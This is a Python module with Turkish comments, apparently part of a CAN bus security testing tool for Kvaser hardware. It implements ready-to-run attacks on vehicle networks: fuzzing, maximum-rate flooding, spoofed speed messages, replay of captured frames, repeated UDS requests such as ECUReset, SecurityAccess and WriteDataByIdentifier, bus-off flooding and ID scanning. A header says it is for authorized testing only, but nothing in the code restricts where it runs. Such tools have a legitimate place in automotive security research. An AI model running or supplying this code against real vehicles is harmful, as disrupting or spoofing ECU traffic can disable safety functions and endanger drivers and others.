"""
CAN Bus Siber Güvenlik Test Modülü
Kvaser Memorator 2xHS ile CAN bus güvenlik testi

⚠️ UYARI: Bu yazılım SADECE yetkili güvenlik testleri, araştırma ve eğitim amaçlı kullanılmalıdır.
⚠️ WARNING: This software is ONLY for authorized security testing, research, and educational purposes.

Desteklenen Saldırı Türleri:
1. Fuzzing - Rastgele CAN mesajları gönderme
2. DoS - Bus flooding (servis dışı bırakma)
3. Spoofing - Sahte mesaj gönderme
4. Replay Attack - Mesaj tekrarı
5. Diagnostic Attack - UDS komut gönderme
6. Error Frame Injection - Hata frame enjeksiyonu
7. Bus Off Attack - Bus off durumu oluşturma
8. ID Scan - CAN ID tarama
"""

import logging
import random
import struct
import threading
import time
from dataclasses import dataclass
from enum import Enum
from typing import List, Optional, Callable

try:
    from canlib import canlib, Frame
    CANLIB_AVAILABLE = True
except ImportError:
    CANLIB_AVAILABLE = False
    logging.warning("Kvaser CANlib bulunamadı. CAN saldırı işlevselliği sınırlı olacak.")


class AttackType(Enum):
    """Saldırı türleri"""
    FUZZING = "fuzzing"
    DOS = "dos"
    SPOOFING = "spoofing"
    REPLAY = "replay"
    DIAGNOSTIC = "diagnostic"
    ERROR_FRAME = "error_frame"
    BUS_OFF = "bus_off"
    ID_SCAN = "id_scan"


@dataclass
class AttackConfig:
    """Saldırı konfigürasyonu"""
    attack_type: AttackType
    target_id: Optional[int] = None
    packet_rate: float = 100.0  # packets/second
    duration: float = 10.0  # seconds
    id_range_start: int = 0x000
    id_range_end: int = 0x7FF
    data_length: int = 8
    use_extended_id: bool = False

    # Replay attack için
    replay_messages: List[tuple] = None  # [(id, data), ...]

    # Diagnostic attack için
    diagnostic_service: int = 0x10  # Default: DiagnosticSessionControl
    diagnostic_target: int = 0x7DF  # Default: Broadcast


class CANSecurityTester:
    """
    CAN Bus Güvenlik Test Sistemi

    Kvaser Memorator 2xHS ile çeşitli CAN bus saldırıları gerçekleştirir.
    """

    def __init__(self, channel: int = 0, bitrate: int = 500000):
        """
        CAN güvenlik tester başlat

        Args:
            channel: CAN kanal numarası
            bitrate: CAN bit rate (örn: 125000, 250000, 500000, 1000000)
        """
        self.channel_num = channel
        self.bitrate = bitrate
        self.channel = None
        self.is_connected = False

        # Thread kontrol
        self.running = False
        self.attack_thread = None
        self.monitor_thread = None

        # Saldırı durumu
        self.current_attack: Optional[AttackConfig] = None
        self.packets_sent = 0
        self.packets_received = 0
        self.errors = 0

        # Callback'ler
        self.status_callback: Optional[Callable[[str, dict], None]] = None
        self.message_callback: Optional[Callable[[Frame], None]] = None

        # Captured messages (replay için)
        self.captured_messages: List[tuple] = []
        self.capture_enabled = False

        self.logger = logging.getLogger(__name__)

        if not CANLIB_AVAILABLE:
            self.logger.error("Kvaser CANlib yüklü değil!")

    def connect(self) -> bool:
        """CAN kanala bağlan"""
        if not CANLIB_AVAILABLE:
            self.logger.error("CANlib kütüphanesi bulunamadı")
            return False

        try:
            # Kanal aç
            self.channel = canlib.openChannel(
                self.channel_num,
                canlib.canOPEN_ACCEPT_VIRTUAL
            )

            # Bit rate ayarla
            self.channel.setBusParams(self.bitrate)

            # Bus'ı aç
            self.channel.busOn()

            self.is_connected = True
            self.logger.info(f"CAN bağlantısı başarılı: Kanal {self.channel_num}, {self.bitrate} bit/s")

            # Monitor thread'i başlat
            self._start_monitor()

            return True

        except Exception as e:
            self.logger.error(f"CAN bağlantı hatası: {e}")
            self.is_connected = False
            return False

    def disconnect(self):
        """CAN bağlantısını kes"""
        self.stop_attack()
        self._stop_monitor()

        if self.channel:
            try:
                self.channel.busOff()
                self.channel.close()
                self.logger.info("CAN bağlantısı kapatıldı")
            except Exception as e:
                self.logger.error(f"CAN kapatma hatası: {e}")

        self.is_connected = False
        self.channel = None

    def set_bitrate(self, bitrate: int) -> bool:
        """
        CAN bit rate değiştir

        Args:
            bitrate: Yeni bit rate (125000, 250000, 500000, 1000000)
        """
        was_connected = self.is_connected

        if was_connected:
            self.disconnect()

        self.bitrate = bitrate

        if was_connected:
            return self.connect()

        return True

    def start_attack(self, config: AttackConfig) -> bool:
        """
        Saldırı başlat

        Args:
            config: Saldırı konfigürasyonu
        """
        if not self.is_connected:
            self.logger.error("CAN bağlantısı yok!")
            return False

        if self.running:
            self.logger.warning("Zaten bir saldırı çalışıyor!")
            return False

        self.current_attack = config
        self.packets_sent = 0
        self.errors = 0

        self.running = True

        # Saldırı thread'ini başlat
        self.attack_thread = threading.Thread(
            target=self._attack_loop,
            daemon=True,
            name=f"Attack_{config.attack_type.value}"
        )
        self.attack_thread.start()

        self.logger.info(f"Saldırı başlatıldı: {config.attack_type.value}")
        self._update_status("running", {"attack_type": config.attack_type.value})

        return True

    def stop_attack(self):
        """Saldırıyı durdur"""
        self.running = False

        if self.attack_thread:
            self.attack_thread.join(timeout=2.0)
            self.attack_thread = None

        if self.current_attack:
            self.logger.info(
                f"Saldırı durduruldu: {self.current_attack.attack_type.value}, "
                f"Gönderilen: {self.packets_sent}, Hata: {self.errors}"
            )
            self._update_status("stopped", {
                "packets_sent": self.packets_sent,
                "errors": self.errors
            })

        self.current_attack = None

    def start_capture(self):
        """Mesaj yakalamayı başlat (replay attack için)"""
        self.captured_messages.clear()
        self.capture_enabled = True
        self.logger.info("Mesaj yakalama başlatıldı")

    def stop_capture(self) -> List[tuple]:
        """Mesaj yakalamayı durdur ve mesajları döndür"""
        self.capture_enabled = False
        self.logger.info(f"{len(self.captured_messages)} mesaj yakalandı")
        return self.captured_messages.copy()

    def set_status_callback(self, callback: Callable[[str, dict], None]):
        """Durum güncellemesi için callback ayarla"""
        self.status_callback = callback

    def set_message_callback(self, callback: Callable[[Frame], None]):
        """Mesaj alımı için callback ayarla"""
        self.message_callback = callback

    def get_statistics(self) -> dict:
        """İstatistikleri döndür"""
        return {
            'connected': self.is_connected,
            'running': self.running,
            'attack_type': self.current_attack.attack_type.value if self.current_attack else None,
            'packets_sent': self.packets_sent,
            'packets_received': self.packets_received,
            'errors': self.errors,
            'bitrate': self.bitrate,
            'channel': self.channel_num
        }

    # ==================== Private Methods ====================

    def _start_monitor(self):
        """Monitor thread'ini başlat"""
        self.monitor_thread = threading.Thread(
            target=self._monitor_loop,
            daemon=True,
            name="CAN_Monitor"
        )
        self.monitor_thread.start()

    def _stop_monitor(self):
        """Monitor thread'ini durdur"""
        if self.monitor_thread:
            self.monitor_thread.join(timeout=1.0)
            self.monitor_thread = None

    def _monitor_loop(self):
        """CAN bus monitoring loop"""
        timeout = 100  # ms

        while self.is_connected:
            try:
                frame = self.channel.read(timeout=timeout)
                self.packets_received += 1

                # Capture mesajları
                if self.capture_enabled:
                    self.captured_messages.append((frame.id, frame.data))

                # Callback çağır
                if self.message_callback:
                    self.message_callback(frame)

            except canlib.CanNoMsg:
                pass
            except Exception as e:
                self.logger.error(f"Monitor hatası: {e}")
                time.sleep(0.1)

    def _attack_loop(self):
        """Saldırı ana loop"""
        if not self.current_attack:
            return

        attack_type = self.current_attack.attack_type

        # Saldırı türüne göre uygun fonksiyonu çağır
        attack_functions = {
            AttackType.FUZZING: self._fuzzing_attack,
            AttackType.DOS: self._dos_attack,
            AttackType.SPOOFING: self._spoofing_attack,
            AttackType.REPLAY: self._replay_attack,
            AttackType.DIAGNOSTIC: self._diagnostic_attack,
            AttackType.ERROR_FRAME: self._error_frame_attack,
            AttackType.BUS_OFF: self._bus_off_attack,
            AttackType.ID_SCAN: self._id_scan_attack
        }

        attack_func = attack_functions.get(attack_type)

        if attack_func:
            try:
                attack_func()
            except Exception as e:
                self.logger.error(f"Saldırı hatası: {e}")
                self.errors += 1
        else:
            self.logger.error(f"Bilinmeyen saldırı türü: {attack_type}")

    def _fuzzing_attack(self):
        """Fuzzing saldırısı - Rastgele CAN mesajları"""
        config = self.current_attack
        interval = 1.0 / config.packet_rate
        start_time = time.time()

        self.logger.info(
            f"Fuzzing başlatıldı: "
            f"ID range: 0x{config.id_range_start:03X}-0x{config.id_range_end:03X}, "
            f"Rate: {config.packet_rate} pkt/s"
        )

        while self.running and (time.time() - start_time) < config.duration:
            try:
                # Rastgele ID ve data
                can_id = random.randint(config.id_range_start, config.id_range_end)
                data = bytes([random.randint(0, 255) for _ in range(config.data_length)])

                # Frame oluştur ve gönder
                frame = Frame(
                    id_=can_id,
                    data=data,
                    dlc=config.data_length,
                    flags=canlib.MessageFlag.EXT if config.use_extended_id else 0
                )

                self.channel.write(frame)
                self.packets_sent += 1

                # Rate kontrolü
                time.sleep(interval)

            except Exception as e:
                self.logger.error(f"Fuzzing gönderim hatası: {e}")
                self.errors += 1

    def _dos_attack(self):
        """DoS saldırısı - Bus flooding"""
        config = self.current_attack
        start_time = time.time()

        self.logger.info(f"DoS saldırısı başlatıldı: Hedef ID: 0x{config.target_id:03X}")

        # Maksimum hızda mesaj gönder
        while self.running and (time.time() - start_time) < config.duration:
            try:
                # Aynı mesajı sürekli gönder
                data = bytes([0xFF] * config.data_length)
                frame = Frame(
                    id_=config.target_id or 0x000,
                    data=data,
                    dlc=config.data_length
                )

                self.channel.write(frame)
                self.packets_sent += 1

                # Minimal delay (maksimum bus yükü)
                time.sleep(0.0001)

            except Exception as e:
                self.logger.error(f"DoS gönderim hatası: {e}")
                self.errors += 1

    def _spoofing_attack(self):
        """Spoofing saldırısı - Sahte mesaj gönderme"""
        config = self.current_attack
        interval = 1.0 / config.packet_rate
        start_time = time.time()

        self.logger.info(
            f"Spoofing saldırısı başlatıldı: "
            f"Hedef ID: 0x{config.target_id:03X}"
        )

        while self.running and (time.time() - start_time) < config.duration:
            try:
                # Belirli bir ID'ye sahte mesaj gönder
                # Örnek: Hız verisini manipüle et
                fake_speed = random.randint(0, 250)  # km/h
                data = bytearray(8)
                data[0] = fake_speed & 0xFF
                data[1] = (fake_speed >> 8) & 0xFF

                frame = Frame(
                    id_=config.target_id or 0x302,
                    data=bytes(data),
                    dlc=8
                )

                self.channel.write(frame)
                self.packets_sent += 1

                time.sleep(interval)

            except Exception as e:
                self.logger.error(f"Spoofing gönderim hatası: {e}")
                self.errors += 1

    def _replay_attack(self):
        """Replay saldırısı - Yakalanan mesajları tekrarla"""
        config = self.current_attack

        if not config.replay_messages:
            self.logger.warning("Replay için mesaj bulunamadı!")
            return

        interval = 1.0 / config.packet_rate
        start_time = time.time()

        self.logger.info(
            f"Replay saldırısı başlatıldı: "
            f"{len(config.replay_messages)} mesaj tekrarlanacak"
        )

        while self.running and (time.time() - start_time) < config.duration:
            try:
                # Yakalanan mesajları sırayla tekrarla
                for msg_id, msg_data in config.replay_messages:
                    if not self.running:
                        break

                    frame = Frame(
                        id_=msg_id,
                        data=msg_data,
                        dlc=len(msg_data)
                    )

                    self.channel.write(frame)
                    self.packets_sent += 1

                    time.sleep(interval)

            except Exception as e:
                self.logger.error(f"Replay gönderim hatası: {e}")
                self.errors += 1

    def _diagnostic_attack(self):
        """Diagnostic saldırısı - UDS komutları"""
        config = self.current_attack
        interval = 1.0 / config.packet_rate
        start_time = time.time()

        # UDS servisleri
        uds_services = [
            0x10,  # DiagnosticSessionControl
            0x11,  # ECUReset
            0x27,  # SecurityAccess
            0x22,  # ReadDataByIdentifier
            0x2E,  # WriteDataByIdentifier
            0x3E,  # TesterPresent
            0x85,  # ControlDTCSetting
        ]

        self.logger.info(
            f"Diagnostic saldırısı başlatıldı: "
            f"Hedef: 0x{config.diagnostic_target:03X}"
        )

        while self.running and (time.time() - start_time) < config.duration:
            try:
                # Her UDS servisini dene
                for service in uds_services:
                    if not self.running:
                        break

                    # UDS request frame
                    data = bytearray(8)
                    data[0] = service
                    data[1] = 0x01  # Sub-function

                    frame = Frame(
                        id_=config.diagnostic_target,
                        data=bytes(data),
                        dlc=8
                    )

                    self.channel.write(frame)
                    self.packets_sent += 1

                    time.sleep(interval)

            except Exception as e:
                self.logger.error(f"Diagnostic gönderim hatası: {e}")
                self.errors += 1

    def _error_frame_attack(self):
        """Error frame injection saldırısı"""
        # NOT: Bu saldırı türü özel donanım gerektirir
        # Kvaser Memorator bazı modeller error frame gönderemez
        self.logger.warning(
            "Error frame injection özel donanım gerektirir. "
            "Standart fuzzing ile devam ediliyor."
        )
        self._fuzzing_attack()

    def _bus_off_attack(self):
        """Bus off saldırısı - Bus'ı bus-off durumuna getirmeye çalış"""
        config = self.current_attack
        start_time = time.time()

        self.logger.info("Bus off saldırısı başlatıldı")

        # Maksimum hızda hatalı mesajlar gönder
        while self.running and (time.time() - start_time) < config.duration:
            try:
                # Yüksek öncelikli ID'lerle flooding
                for can_id in range(0x000, 0x010):
                    if not self.running:
                        break

                    data = bytes([0xFF] * 8)
                    frame = Frame(id_=can_id, data=data, dlc=8)

                    self.channel.write(frame)
                    self.packets_sent += 1

            except Exception as e:
                self.logger.error(f"Bus off gönderim hatası: {e}")
                self.errors += 1

    def _id_scan_attack(self):
        """ID tarama - Aktif CAN ID'lerini tespit et"""
        config = self.current_attack
        interval = 1.0 / config.packet_rate

        self.logger.info(
            f"ID tarama başlatıldı: "
            f"0x{config.id_range_start:03X}-0x{config.id_range_end:03X}"
        )

        # Her ID'ye test mesajı gönder
        for can_id in range(config.id_range_start, config.id_range_end + 1):
            if not self.running:
                break

            try:
                # Test mesajı (genelde cevap alınmaz ama bus'ta varlığı test edilir)
                data = bytes([0x00] * 8)
                frame = Frame(id_=can_id, data=data, dlc=8)

                self.channel.write(frame)
                self.packets_sent += 1

                time.sleep(interval)

            except Exception as e:
                self.logger.error(f"ID scan gönderim hatası: {e}")
                self.errors += 1

        self.logger.info(f"ID tarama tamamlandı: {self.packets_sent} ID test edildi")

    def _update_status(self, status: str, data: dict):
        """Durum güncellemesi gönder"""
        if self.status_callback:
            self.status_callback(status, data)


# Mock sınıf (test için)
class MockCANSecurityTester(CANSecurityTester):
    """Mock CAN security tester (test için)"""

    def __init__(self, **kwargs):
        self.channel_num = kwargs.get('channel', 0)
        self.bitrate = kwargs.get('bitrate', 500000)
        self.channel = None
        self.is_connected = False

        self.running = False
        self.attack_thread = None
        self.monitor_thread = None

        self.current_attack: Optional[AttackConfig] = None
        self.packets_sent = 0
        self.packets_received = 0
        self.errors = 0

        self.status_callback: Optional[Callable[[str, dict], None]] = None
        self.message_callback: Optional[Callable[[Frame], None]] = None

        self.captured_messages: List[tuple] = []
        self.capture_enabled = False

        self.logger = logging.getLogger(__name__)
        self.logger.info("Mock CAN Security Tester oluşturuldu")

    def connect(self) -> bool:
        """Mock bağlantı"""
        self.is_connected = True
        self.logger.info(f"Mock CAN bağlantısı: Kanal {self.channel_num}, {self.bitrate} bit/s")
        return True

    def disconnect(self):
        """Mock bağlantı kesme"""
        self.stop_attack()
        self.is_connected = False
        self.logger.info("Mock CAN bağlantısı kesildi")

    def _monitor_loop(self):
        """Mock monitor (boş)"""
        pass


if __name__ == "__main__":
    # Test
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    # Mock tester
    tester = MockCANSecurityTester(channel=0, bitrate=500000)

    def status_update(status, data):
        print(f"Status: {status}, Data: {data}")

    tester.set_status_callback(status_update)
    tester.connect()

    # Fuzzing test
    config = AttackConfig(
        attack_type=AttackType.FUZZING,
        packet_rate=100,
        duration=5,
        id_range_start=0x100,
        id_range_end=0x200,
        data_length=8
    )

    print("\n=== Fuzzing Saldırısı Testi ===")
    tester.start_attack(config)
    time.sleep(6)

    stats = tester.get_statistics()
    print(f"\nİstatistikler: {stats}")

    tester.disconnect()
    print("\nTest tamamlandı")
